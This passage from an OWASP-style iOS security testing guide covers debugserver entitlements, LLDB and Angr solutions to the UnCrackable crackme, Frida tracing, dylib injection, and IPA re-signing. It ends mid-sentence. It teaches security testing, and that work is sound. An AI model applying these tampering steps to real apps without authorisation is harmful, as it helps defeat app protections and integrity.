is not the latest version available, but nevertheless addresses our
purpose).

\hypertarget{open-files-1}{%
\subparagraph{Open Files}\label{open-files-1}}

\texttt{lsof} is a powerful command, and provides a plethora of
information about a running process. It can provide a list of all open
files, including a stream, a network file or a regular file. When
invoking the \texttt{lsof} command without any option it will list all
open files belonging to all active processes on the system, while when
invoking with the flags
\texttt{-c\ \textless{}process\ name\textgreater{}} or
\texttt{-p\ \textless{}pid\textgreater{}}, it returns the list of open
files for the specified process. The
\href{http://man7.org/linux/man-pages/man8/lsof.8.html}{man page} shows
various other options in detail.

Using \texttt{lsof} for an iOS application running with PID 2828, list
various open files as shown below.

\begin{verbatim}
iPhone:~ root# lsof -p 2828
COMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
iOweApp 2828 mobile  cwd    DIR    1,2      864      2 /
iOweApp 2828 mobile  txt    REG    1,3   206144 189774 /private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp
iOweApp 2828 mobile  txt    REG    1,3     5492 213230 /private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2B-972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C5224537F7F23DF19314CF6FD8AA.closure
iOweApp 2828 mobile  txt    REG    1,3    30628 212198 /private/var/preferences/Logging/.plist-cache.vqXhr1EE
iOweApp 2828 mobile  txt    REG    1,2    50080 234433 /usr/lib/libobjc-trampolines.dylib
iOweApp 2828 mobile  txt    REG    1,2   344204  74185 /System/Library/Fonts/AppFonts/ChalkboardSE.ttc
iOweApp 2828 mobile  txt    REG    1,2   664848 234595 /usr/lib/dyld
...
\end{verbatim}

\hypertarget{open-connections-1}{%
\subparagraph{Open Connections}\label{open-connections-1}}

\texttt{lsof} command when invoked with option \texttt{-i}, it gives the
list of open network ports for all active processes on the device. To
get a list of open network ports for a specific process, the
\texttt{lsof\ -i\ -a\ -p\ \textless{}pid\textgreater{}} command can be
used, where \texttt{-a} (AND) option is used for filtering. Below a
filtered output for PID 1 is shown.

\begin{verbatim}
iPhone:~ root# lsof -i -a -p 1
COMMAND PID USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
launchd   1 root   27u  IPv6 0x69c2ce210efdc023      0t0  TCP *:ssh (LISTEN)
launchd   1 root   28u  IPv6 0x69c2ce210efdc023      0t0  TCP *:ssh (LISTEN)
launchd   1 root   29u  IPv4 0x69c2ce210eeaef53      0t0  TCP *:ssh (LISTEN)
launchd   1 root   30u  IPv4 0x69c2ce210eeaef53      0t0  TCP *:ssh (LISTEN)
launchd   1 root   31u  IPv4 0x69c2ce211253b90b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)
launchd   1 root   42u  IPv4 0x69c2ce211253b90b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)
\end{verbatim}

\hypertarget{sandbox-inspection-1}{%
\subparagraph{Sandbox Inspection}\label{sandbox-inspection-1}}

On iOS, each application gets a sandboxed folder to store its data. As
per the iOS security model, an application's sandboxed folder cannot be
accessed by another application. Additionally, the users do not have
direct access to the iOS filesystem, thus preventing browsing or
extraction of data from the filesystem. In iOS \textless{} 8.3 there
were applications available which can be used to browse the device's
filesystem, such as iExplorer and iFunBox, but in the recent version of
iOS (\textgreater8.3) the sandboxing rules are more stringent and these
applications do not work anymore. As a result, if you need to access the
filesystem it can only be accessed on a jailbroken device. As part of
the jailbreaking process, the application sandbox protection is disabled
and thus enabling an easy access to sandboxed folders.

The contents of an application's sandboxed folder has already been
discussed in
``\href{0x06b-Basic-Security-Testing.md\#accessing-app-data-directories}{Accessing
App Data Directories}'' in the chapter iOS Basic Security Testing. This
chapter gives an overview of the folder structure and which directories
you should analyze.

\hypertarget{debugging-1}{%
\paragraph{Debugging}\label{debugging-1}}

Coming from a Linux background you'd expect the \texttt{ptrace} system
call to be as powerful as you're used to but, for some reason, Apple
decided to leave it incomplete. iOS debuggers such as LLDB use it for
attaching, stepping or continuing the process but they cannot use it to
read or write memory (all \texttt{PT\_READ\_*} and \texttt{PT\_WRITE*}
requests are missing). Instead, they have to obtain a so-called Mach
task port (by calling \texttt{task\_for\_pid} with the target process
ID) and then use the Mach IPC interface API functions to perform actions
such as suspending the target process and reading/writing register
states (\texttt{thread\_get\_state}/\texttt{thread\_set\_state}) and
virtual memory (\texttt{mach\_vm\_read}/\texttt{mach\_vm\_write}).

\begin{quote}
For more information you can refer to the LLVM project in GitHub which
contains the
\href{https://github.com/llvm/llvm-project/tree/master/lldb}{source code
for LLDB} as well as Chapter 5 and 13 from ``Mac OS X and iOS Internals:
To the Apple's Core'' {[}\#levin{]} and Chapter 4 ``Tracing and
Debugging'' from ``The Mac Hacker's Handbook'' {[}\#miller{]}.
\end{quote}

\hypertarget{debugging-with-lldb}{%
\subparagraph{Debugging with LLDB}\label{debugging-with-lldb}}

The default debugserver executable that Xcode installs can't be used to
attach to arbitrary processes (it is usually used only for debugging
self-developed apps deployed with Xcode). To enable debugging of
third-party apps, the \texttt{task\_for\_pid-allow} entitlement must be
added to the debugserver executable so that the debugger process can
call \texttt{task\_for\_pid} to obtain the target Mach task port as seen
before. An easy way to do this is to add the entitlement to the
\href{http://iphonedevwiki.net/index.php/Debugserver}{debugserver binary
shipped with Xcode}.

To obtain the executable, mount the following DMG image:

\begin{verbatim}
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.dmg
\end{verbatim}

You'll find the debugserver executable in the \texttt{/usr/bin/}
directory on the mounted volume. Copy it to a temporary directory, then
create a file called \texttt{entitlements.plist} with the following
content:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="UTF{-}8"}\KeywordTok{?>}
\DataTypeTok{<!DOCTYPE }\NormalTok{plist PUBLIC "{-}//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/ PropertyList{-}1.0.dtd"}\DataTypeTok{>}
\KeywordTok{<plist}\OtherTok{ version=}\StringTok{"1.0"}\KeywordTok{>}
\KeywordTok{<dict>}
    \KeywordTok{<key>}\NormalTok{com.apple.springboard.debugapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{run{-}unsigned{-}code}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{get{-}task{-}allow}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{task\_for\_pid{-}allow}\KeywordTok{</key>}
    \KeywordTok{<true/>}
\KeywordTok{</dict>}
\KeywordTok{</plist>}
\end{Highlighting}
\end{Shaded}

Apply the entitlement with codesign:

\begin{verbatim}
$ codesign -s - --entitlements entitlements.plist -f debugserver
\end{verbatim}

Copy the modified binary to any directory on the test device. The
following examples use usbmuxd to forward a local port through USB.

\begin{verbatim}
$ iproxy 2222 22
$ scp -P 2222 debugserver root@localhost:/tmp/
\end{verbatim}

Note: On iOS 12 and higher, use the following procedure to sign the
debugserver binary obtained from the XCode image.

\begin{enumerate}
\def\labelenumi{\arabic{enumi})}
\item
  Copy the debugserver binary to the device via scp, for example, in the
  /tmp folder.
\item
  Connect to the device via SSH and create the file, named
  entitlements.xml, with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{<!DOCTYPE }\NormalTok{plist PUBLIC "{-}//Apple//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList{-}1.0.dtd"}\DataTypeTok{>}
\KeywordTok{<plist}\OtherTok{ version=}\StringTok{"1.0"}\KeywordTok{>}
\KeywordTok{<dict>}
    \KeywordTok{<key>}\NormalTok{platform{-}application}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.private.security.no{-}container}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.private.skip{-}library{-}validation}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.backboardd.debugapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.backboardd.launchapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.diagnosticd.diagnostic}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.frontboard.debugapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.frontboard.launchapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.security.network.client}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.security.network.server}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.springboard.debugapplications}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{com.apple.system{-}task{-}ports}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{get{-}task{-}allow}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{run{-}unsigned{-}code}\KeywordTok{</key>}
    \KeywordTok{<true/>}
    \KeywordTok{<key>}\NormalTok{task\_for\_pid{-}allow}\KeywordTok{</key>}
    \KeywordTok{<true/>}
\KeywordTok{</dict>}
\KeywordTok{</plist>}
\end{Highlighting}
\end{Shaded}
\item
  Type the following command to sign the debugserver binary:

\begin{verbatim}
$ ldid -Sentitlements.xml debugserver
\end{verbatim}
\item
  Verify that the debugserver binary can be executed via the following
  command:

\begin{verbatim}
$ ./debugserver
\end{verbatim}
\end{enumerate}

You can now attach debugserver to any process running on the device.

\begin{verbatim}
VP-iPhone-18:/tmp root# ./debugserver *:1234 -a 2670
debugserver-@(#)PROGRAM:debugserver  PROJECT:debugserver-320.2.89
for armv7.
Attaching to process 2670...
\end{verbatim}

With the following command you can launch an application via debugserver
running on the target device:

\begin{verbatim}
debugserver -x backboard *:1234 /Applications/MobileSMS.app/MobileSMS
\end{verbatim}

Attach to an already running application:

\begin{verbatim}
debugserver *:1234 -a "MobileSMS"
\end{verbatim}

You may connect now to the iOS device from your host computer:

\begin{verbatim}
(lldb) process connect connect://<ip-of-ios-device>:1234
\end{verbatim}

Typing \texttt{image\ list} gives a list of main executable and all
dependent libraries.

\hypertarget{debugging-release-apps-1}{%
\subparagraph{Debugging Release Apps}\label{debugging-release-apps-1}}

In the previous section we learned about how to setup a debugging
environment on an iOS device using LLDB. In this section we will use
this information and learn how to debug a 3rd party release application.
We will continue using the
\href{https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/iOS/Level_01/UnCrackable_Level1.ipa}{UnCrackable
Level 1 crackme app} and solve it using a debugger.

In contrast to a debug build, the code compiled for a release build is
optimized to achieve maximum performance and minimum binary build size.
As a general best practice, most of the debug symbols are stripped for a
release build, adding a layer of complexity when reverse engineering and
debugging the binaries.

Due to the absence of the debug symbols, symbol names are missing from
the backtrace outputs and setting breakpoints by simply using function
names is not possible. Fortunately, debuggers also support setting
breakpoints directly on memory addresses. Further in this section we
will learn how to do so and eventually solve the crackme challenge.

Some groundwork is needed before setting a breakpoint using memory
addresses. It requires determining two offsets:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Breakpoint offset: The \emph{address offset} of the code where we want
  to set a breakpoint. This address is obtained by performing static
  analysis of the code in a disassembler like Ghidra.
\item
  ASLR shift offset: The \emph{ASLR shift offset} for the current
  process. Since ASLR offset is randomly generated on every new instance
  of an application, this has to be obtained for every debugging session
  individually. This is determined using the debugger itself.
\end{enumerate}

\begin{quote}
iOS is a modern operating system with multiple techniques implemented to
mitigate code execution attacks, one such technique being Address Space
Randomization Layout (ASLR). On every new execution of an application, a
random ASLR shift offset is generated, and various process' data
structures are shifted by this offset.
\end{quote}

The final breakpoint address to be used in the debugger is the sum of
the above two addresses (Breakpoint offset + ASLR shift offset). This
approach assumes that the image base address (discussed shortly) used by
the disassembler and iOS is the same, which is true most of the time.

When a binary is opened in a disassembler like Ghidra, it loads a binary
by emulating the respective operating system's loader. The address at
which the binary is loaded is called \emph{image base address}. All the
code and symbols inside this binary can be addressed using a constant
address offset from this image base address. In Ghidra, the image base
address can be obtained by determining the address of the start of a
Mach-O file. In this case, it is 0x100000000.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/ebc00f60d8d1aad4169130902c075b6da5552d9c.png}
\caption{Obtaining image base address using Ghidra}
\end{figure}

From our previous analysis of the UnCrackable Level 1 application in
``\protect\hyperlink{manual-reversed-code-review}{Manual (Reversed) Code
Review}'' section, the value of the hidden string is stored in a label
with the \texttt{hidden} flag set. In the disassembly, the text value of
this label is stored in register \texttt{X21}, stored via \texttt{mov}
from \texttt{X0}, at offset 0x100004520. This is our \emph{breakpoint
offset}.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/2232357dcab82a2afd5c51a6eeb185b4f7f281e9.png}
\caption{Breakpoint address using Ghidra}
\end{figure}

For the second address, we need to determine the \emph{ASLR shift
offset} for a given process. The ASLR offset can be determined by using
the LLDB command \texttt{image\ list\ -o\ -f}. The output is shown in
the screenshot below.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/a3b0e5e3a2b9e0460b87f2fd5e167803aa68278f.png}
\caption{Process image list}
\end{figure}

In the output, the first column contains the sequence number of the
image ({[}X{]}), the second column contains the randomly generated ASLR
offset, while 3rd column contains the full path of the image and towards
the end, content in the bracket shows the image base address after
adding ASLR offset to the original image base address (0x100000000 +
0x70000 = 0x100070000). You will notice the image base address of
0x100000000 is same as in Ghidra. Now, to obtain the effective memory
address for a code location we only need to add ASLR offset to the
address identified in Ghidra. The effective address to set the
breakpoint will be 0x100004520 + 0x70000 = 0x100074520. The breakpoint
can be set using command \texttt{b\ 0x100074520}.

\begin{quote}
In the above output, you may also notice that many of the paths listed
as images do not point to the file system on the iOS device. Instead,
they point to a certain location on the machine on which LLDB is
running. These images are system libraries for which debug symbols are
available on the machine to aid in application development and debugging
(as part of the Xcode iOS SDK). Therefore, you may set breakpoints to
these libraries directly by using function names.
\end{quote}

After putting the breakpoint and running the app, the execution will be
halted once the breakpoint is hit. Now you can access and explore the
current state of the process. In this case, you know from the previous
static analysis that the register \texttt{X0} contains the hidden
string, thus let's explore it. In LLDB you can print Objective-C objects
using the \texttt{po} (\emph{print object}) command.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/aafba1daf9b3c7d33c63306630e1ad7c2adea156.png}
\caption{Setting breakpoint in LLDB}
\end{figure}

Voila, the crackme can be easily solved aided by static analysis and a
debugger. There are plethora of features implemented in LLDB, including
changing the value of the registers, changing values in the process
memory and even \href{https://lldb.llvm.org/use/python.html}{automating
tasks using Python scripts}.

Officially Apple recommends use of LLDB for debugging purposes, but GDB
can be also used on iOS. The techniques discussed above are applicable
while debugging using GDB as well, provided the LLDB specific commands
are \href{https://lldb.llvm.org/use/map.html}{changed to GDB commands}.

\hypertarget{tracing-1}{%
\paragraph{Tracing}\label{tracing-1}}

\hypertarget{execution-tracing-1}{%
\subparagraph{Execution Tracing}\label{execution-tracing-1}}

Intercepting Objective-C methods is a useful iOS security testing
technique. For example, you may be interested in data storage operations
or network requests. In the following example, we'll write a simple
tracer for logging HTTP(S) requests made via iOS standard HTTP APIs.
We'll also show you how to inject the tracer into the Safari web
browser.

In the following examples, we'll assume that you are working on a
jailbroken device. If that's not the case, you first need to follow the
steps outlined in section
\protect\hyperlink{repackaging-and-re-signing}{Repackaging and
Re-Signing} to repackage the Safari app.

Frida comes with \texttt{frida-trace}, a function tracing tool.
\texttt{frida-trace} accepts Objective-C methods via the \texttt{-m}
flag. You can pass it wildcards as well-given \texttt{-{[}NSURL\ *{]}},
for example, \texttt{frida-trace} will automatically install hooks on
all \texttt{NSURL} class selectors. We'll use this to get a rough idea
about which library functions Safari calls when the user opens a URL.

Run Safari on the device and make sure the device is connected via USB.
Then start \texttt{frida-trace} as follows:

\begin{verbatim}
$ frida-trace -U -m "-[NSURL *]" Safari
Instrumenting functions...
-[NSURL isMusicStoreURL]: Loaded handler at "/Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js"
-[NSURL isAppStoreURL]: Loaded handler at "/Users/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js"
(...)
Started tracing 248 functions. Press Ctrl+C to stop.
\end{verbatim}

Next, navigate to a new website in Safari. You should see traced
function calls on the \texttt{frida-trace} console. Note that the
\texttt{initWithURL:} method is called to initialize a new URL request
object.

\begin{verbatim}
           /* TID 0xc07 */
  20313 ms  -[NSURLRequest _initWithCFURLRequest:0x1043bca30 ]
 20313 ms  -[NSURLRequest URL]
(...)
 21324 ms  -[NSURLRequest initWithURL:0x106388b00 ]
 21324 ms     | -[NSURLRequest initWithURL:0x106388b00 cachePolicy:0x0 timeoutInterval:0x106388b80
\end{verbatim}

\hypertarget{emulation-based-analysis-1}{%
\paragraph{Emulation-based Analysis}\label{emulation-based-analysis-1}}

\hypertarget{ios-simulator}{%
\subparagraph{iOS Simulator}\label{ios-simulator}}

Apple provides a simulator app within Xcode which provides a \emph{real
iOS device looking} user interface for iPhone, iPad or Apple Watch. It
allows you to rapidly prototype and test debug builds of your
applications during the development process, but actually \textbf{it is
not an emulator}. Difference between a simulator and an emulator is
previously discussed in
``\href{0x04c-Tampering-and-Reverse-Engineering.md\#emulation-based-dynamic-analysis}{Emulation-based
Dynamic Analysis}'' section.

While developing and debugging an application, the Xcode toolchain
generates x86 code, which can be executed in the iOS simulator. However,
for a release build, only ARM code is generated (incompatible with the
iOS simulator). That's why applications downloaded from the Apple App
Store cannot be used for any kind of application analysis on the iOS
simulator.

\hypertarget{corellium}{%
\subparagraph{Corellium}\label{corellium}}

Corellium is a commercial tool which offers virtual iOS devices running
actual iOS firmware, being the only publicly available iOS emulator
ever. Since it is a proprietary product, not much information is
available about the implementation. Corellium has no trial or community
licenses available, therefore we won't go into much detail regarding its
use.

Corellium allows you to launch multiple instances of a device
(jailbroken or not) which are accessible as local devices (with a simple
VPN configuration). It has the ability to take and restore snapshots of
the device state, and also offers a convenient web-based shell to the
device. Finally and most importantly, due to its ``emulator'' nature,
you can execute applications downloaded from the Apple App Store,
enabling any kind of application analysis as you know it from real iOS
(jailbroken) devices.

\hypertarget{binary-analysis-1}{%
\subsubsection{Binary Analysis}\label{binary-analysis-1}}

An introduction to binary analysis using binary analysis frameworks has
already been discussed in the
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#dynamic-analysis}{Dynamic
Analysis}'' section for Android. We recommend you to revisit this
section and refresh the concepts on this subject.

For Android, we used Angr's symbolic execution engine to solve a
challenge. In this section, we will revisit the Angr binary analysis
framework to analyze the
\href{https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/iOS/Level_01/UnCrackable_Level1.ipa}{UnCrackable
Level 1 crackme app} but instead of symbolic execution we will use its
concrete execution (or dynamic execution) features.

\hypertarget{angr-1}{%
\paragraph{Angr}\label{angr-1}}

Angr is a very versatile tool, providing multiple techniques to
facilitate binary analysis, while supporting various file formats and
hardware instructions sets.

\begin{quote}
The Mach-O backend in Angr is not well-supported, but it works perfectly
fine for our case.
\end{quote}

While manual analyzing the code in the
\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}" section, we reached a point where performing
further manual analysis was cumbersome. The function at offset
\texttt{0x1000080d4} was identified as the final target which contains
the secret string.

If we revisit that function, we can see that it involves multiple
sub-function calls and interestingly none of these functions have any
dependencies on other library calls or system calls. This is a perfect
case to use Angr's concrete execution engine. Follow the steps below to
solve this challenge:

\begin{itemize}
\tightlist
\item
  Get the ARM64 version of the binary by running
  \texttt{lipo\ -thin\ arm64\ \textless{}app\_binary\textgreater{}\ -output\ uncrackable.arm64}
  (ARMv7 can be used as well).
\item
  Create an Angr \texttt{Project} by loading the above binary.
\item
  Get a \texttt{callable} object by passing the address of the function
  to be executed. From the Angr documentation: ``A Callable is a
  representation of a function in the binary that can be interacted with
  like a native python function.''.
\item
  Pass the above \texttt{callable} object to the concrete execution
  engine, which in this case is \texttt{claripy.backends.concrete}.
\item
  Access the memory and extract the string from the pointer returned by
  the above function.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ angr}
\ImportTok{import}\NormalTok{ claripy}

\KeywordTok{def}\NormalTok{ solve():}

    \CommentTok{\# Load the binary by creating angr project.}
\NormalTok{    project }\OperatorTok{=}\NormalTok{ angr.Project(}\StringTok{\textquotesingle{}uncrackable.arm64\textquotesingle{}}\NormalTok{)}

    \CommentTok{\# Pass the address of the function to the callable}
\NormalTok{    func }\OperatorTok{=}\NormalTok{ project.factory.}\BuiltInTok{callable}\NormalTok{(}\BaseNTok{0x1000080d4}\NormalTok{)}

    \CommentTok{\# Get the return value of the function}
\NormalTok{    ptr\_secret\_string }\OperatorTok{=}\NormalTok{ claripy.backends.concrete.convert(func()).value}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Address of the pointer to the secret string: "} \OperatorTok{+} \BuiltInTok{hex}\NormalTok{(ptr\_secret\_string))}

    \CommentTok{\# Extract the value from the pointer to the secret string}
\NormalTok{    secret\_string }\OperatorTok{=}\NormalTok{ func.result\_state.mem[ptr\_secret\_string].string.concrete}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Secret String: }\SpecialCharTok{\{}\NormalTok{secret\_string}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{solve()}
\end{Highlighting}
\end{Shaded}

Above, Angr executed an ARM64 code in an execution environment provided
by one of its concrete execution engines. The result is accessed from
the memory as if the program is executed on a real device. This case is
a good example where binary analysis frameworks enable us to perform a
comprehensive analysis of a binary, even in the absence of specialized
devices needed to run it.

\hypertarget{tampering-and-runtime-instrumentation-1}{%
\subsubsection{Tampering and Runtime
Instrumentation}\label{tampering-and-runtime-instrumentation-1}}

\hypertarget{patching-repackaging-and-re-signing-1}{%
\paragraph{Patching, Repackaging, and
Re-Signing}\label{patching-repackaging-and-re-signing-1}}

Time to get serious! As you already know, IPA files are actually ZIP
archives, so you can use any ZIP tool to unpack the archive.

\begin{verbatim}
$ unzip UnCrackable_Level1.ipa
\end{verbatim}

\hypertarget{patching-example-installing-frida-gadget}{%
\subparagraph{Patching Example: Installing Frida
Gadget}\label{patching-example-installing-frida-gadget}}

IF you want to use Frida on non-jailbroken devices you'll need to
include \texttt{FridaGadget.dylib}. Download it first:

\begin{verbatim}
$ curl -O https://build.frida.re/frida/ios/lib/FridaGadget.dylib
\end{verbatim}

Copy \texttt{FridaGadget.dylib} into the app directory and use optool to
add a load command to the ``UnCrackable Level 1'' binary.

\begin{verbatim}
$ unzip UnCrackable_Level1.ipa
$ cp FridaGadget.dylib Payload/UnCrackable\ Level\ 1.app/
$ optool install -c load -p "@executable_path/FridaGadget.dylib"  -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1
Found FAT Header
Found thin header...
Found thin header...
Inserting a LC_LOAD_DYLIB command for architecture: arm
Successfully inserted a LC_LOAD_DYLIB command for arm
Inserting a LC_LOAD_DYLIB command for architecture: arm64
Successfully inserted a LC_LOAD_DYLIB command for arm64
Writing executable to Payload/UnCrackable Level 1.app/UnCrackable Level 1...
\end{verbatim}

\hypertarget{repackaging-and-re-signing}{%
\subparagraph{Repackaging and
Re-Signing}\label{repackaging-and-re-signing}}

Of course, tampering an app invalidates the main executable's code
signature, so this won't run on a non-jailbroken device. You'll need to
replace the provisioning profile and sign both the main executable and
the files you've made include (e.g.~\texttt{FridaGadget.dylib}) with the
certificate listed in the profile.

First, let's add our own provisioning profile to the package:

\begin{verbatim}
$ cp AwesomeRepackaging.mobileprovision Payload/UnCrackable\ Level\ 1.app/embedded.mobileprovision
\end{verbatim}

Next, we need to make sure that the Bundle ID in \texttt{Info.plist}
matches the one specified in the profile because the codesign tool will
read the Bundle ID from \texttt{Info.plist} during signing; the wrong
value will lead to an invalid signature.

\begin{verbatim}
$ /usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier sg.vantagepoint.repackage" Payload/UnCrackable\ Level\ 1.app/Info.plist
\end{verbatim}

Finally, we use the codesign tool to re-sign both binaries. You need to
use \emph{your} signing identity (in this example
8004380F331DCA22CC1B47FB1A805890AE41C938), which you can output by
executing the command \texttt{security\ find-identity\ -v}.

\begin{verbatim}
$ rm -rf Payload/UnCrackable\ Level\ 1.app/_CodeSignature
$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938  Payload/UnCrackable\ Level\ 1.app/FridaGadget.dylib
Payload/UnCrackable Level 1.app/FridaGadget.dylib: replacing existing signature
\end{verbatim}

\texttt{entitlements.plist} is the file you created for your empty iOS
project.

\begin{verbatim}
$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1
Payload/UnCrackable Level 1.app/UnCrackable Level 1: replacing existing signature
\end{verbatim}

Now you should be ready to run the modified app. Deploy and run the app
on the device:

\begin{verbatim}
$ ios-deploy --debug --bundle Payload/UnCrackable\ Level\ 1.app/
\end{verbatim}

If everything went well, the app should start in debugging mode with
LLDB attached. Frida should then be able to attach to the app as well.
You can verify this via the frida-ps command:

\begin{verbatim}
$ frida-ps -U
PID  Name
---  ------
499  Gadget
\end{verbatim}

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/94b4595a116ad9f96b949066605079edc2104eb6.png}
\caption{Frida on non-JB device}
\end{figure}

When something goes wrong (and it usually does), mismatches between the
provisioning profile and code-signing header are the most likely causes.
Reading the
\href{https://developer.apple.com/support/code-signing/}{official
documentation} helps you understand the code-signing process. Apple's
\href{https://developer.apple.com/library/content/technotes/tn2415/_index.html}{entitlement
troubleshooting page} is also a useful resource.

\hypertarget{patching-react-native-applications-1}{%
\subparagraph{Patching React Native
applications}\label{patching-react-native-applications-1}}

If the \href{https://facebook.github.io/react-native}{React Native}
framework has been used for development, the main application code is in
the file \texttt{Payload/{[}APP{]}.app/main.jsbundle}. This file
contains the JavaScript code. Most of the time, the JavaScript code in
this file is minified. With the tool
\href{https://mindedsecurity.github.io/jstillery}{JStillery}, a
human-readable version of the file can be retried, which will allow code
analysis. The \href{https://github.com/mindedsecurity/jstillery/}{CLI
version of JStillery} and the local server are preferable to the online
version because the latter discloses the source code to a third party.

At installation time, the application archive is unpacked into the
folder
\texttt{/private/var/containers/Bundle/Application/{[}GUID{]}/{[}APP{]}.app}
from iOS 10 onward, so the main JavaScript application file can be
modified at this location.

To identify the exact location of the application folder, you can use
the tool
\href{https://cydia.saurik.com/package/com.slugrail.ipainstaller/}{ipainstaller}:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Use the command \texttt{ipainstaller\ -l} to list the applications
  installed on the device. Get the name of the target application from
  the output list.
\item
  Use the command \texttt{ipainstaller\ -i\ {[}APP\_NAME{]}} to display
  information about the target application, including the installation
  and data folder locations.
\item
  Take the path referenced at the line that starts with
  \texttt{Application:}.
\end{enumerate}

Use the following approach to patch the JavaScript file:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Navigate to the application folder.
\item
  Copy the contents of the file
  \texttt{Payload/{[}APP{]}.app/main.jsbundle} to a temporary file.
\item
  Use \texttt{JStillery} to beautify and de-obfuscate the contents of
  the temporary file.
\item
  Identify the code in the temporary file that should be patched and
  patch it.
\item
  Put the \emph{patched code} on a single line and copy it into the
  original \texttt{Payload/{[}APP{]}.app/main.jsbundle} file.
\item
  Close and restart the application.
\end{enumerate}

\hypertarget{dynamic-instrumentation-1}{%
\paragraph{Dynamic Instrumentation}\label{dynamic-instrumentation-1}}

\hypertarget{tooling-2}{%
\subparagraph{Tooling}\label{tooling-2}}

Frida

\href{https://www.frida.re}{Frida} is a runtime instrumentation
framework that lets you inject JavaScript snippets or portions of your
own library into native Android and iOS apps. If you've already read the
Android section of this guide, you should be quite familiar with this
tool.

If you haven't already done so, install the Frida Python package on your
host machine:

\begin{verbatim}
$ pip install frida
$ pip install frida-tools
\end{verbatim}

To connect Frida to an iOS app, you need a way to inject the Frida
runtime into that app. This is easy to do on a jailbroken device: just
install \texttt{frida-server} through Cydia. Once it has been installed,
the Frida server will automatically run with root privileges, allowing
you to easily inject code into any process.

Start Cydia and add Frida's repository by navigating to \textbf{Manage}
-\textgreater{} \textbf{Sources} -\textgreater{} \textbf{Edit}
-\textgreater{} \textbf{Add} and entering \url{https://build.frida.re}.
You should then be able to find and install the Frida package.

Connect your device via USB and make sure that Frida works by running
the \texttt{frida-ps} command and the flag `-U'. This should return the
list of processes running on the device:

\begin{verbatim}
$ frida-ps -U
PID  Name
---  ----------------
963  Mail
952  Safari
416  BTServer
422  BlueTool
791  CalendarWidget
451  CloudKeychainPro
239  CommCenter
764  ContactsCoreSpot
(...)
\end{verbatim}

We will demonstrate a few more uses for Frida throughout the chapter.

Cycript

Cydia Substrate (formerly called MobileSubstrate) is the standard
framework for developing Cydia runtime patches (the so-called ``Cydia
Substrate Extensions'') on iOS. It comes with Cynject, a tool that
provides code injection support for C.

Cycript is a scripting language developed by Jay Freeman (aka Saurik).
It injects a JavaScriptCore VM into a running process. Via the Cycript
